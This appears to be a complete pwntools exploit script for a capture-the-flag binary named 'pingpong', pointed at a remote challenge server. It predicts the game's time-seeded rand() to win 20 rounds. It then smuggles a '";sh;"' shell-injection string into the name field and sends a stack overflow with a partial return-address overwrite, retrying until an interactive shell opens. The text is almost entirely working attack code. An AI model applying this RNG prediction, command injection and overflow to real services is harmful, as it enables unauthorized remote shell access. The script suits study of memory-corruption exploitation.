#!/usr/bin/python3

from pwn import *
from ctypes import*




exe = ELF("./pingpong")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

glibc = cdll.LoadLibrary('./libc.so.6')

context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*getname+159

        c
        
        tel $rbp
        p& printff
        ''')
        sleep(1)

while(1):
    if args.REMOTE:
        p = remote('67.223.119.69',5005)
    else:
        p = process([exe.path])

    # STAGE1: GEN BACKUP KEY
    #get rand number


    glibc.srand(glibc.time(None))
    i=0
    p.recvuntil("start...")
    while (i !=20):
        rand_num = glibc.rand()
        check = rand_num % 2
        i =i +1
        if check:
            sla("right ='r': ",b'r')
        else :
            sla("right ='r': ",b'l')
        p.recvuntil("Total hits:")



    sla("Your Name is: ",b'";sh;"')
    #GDB()
    payload = b'a'*0x28
    payload += p16(0x52ae)
    sa("Feedback for the game:",payload)




    try:

        p.sendline(b'echo "ABCD"')

        p.recvuntil(b"ABCD")
        info("GET SHELLLLLLLLLLLLLLLLLLLLLL ")
        p.interactive()
        break

    except Exception as e:
        p.close()





    #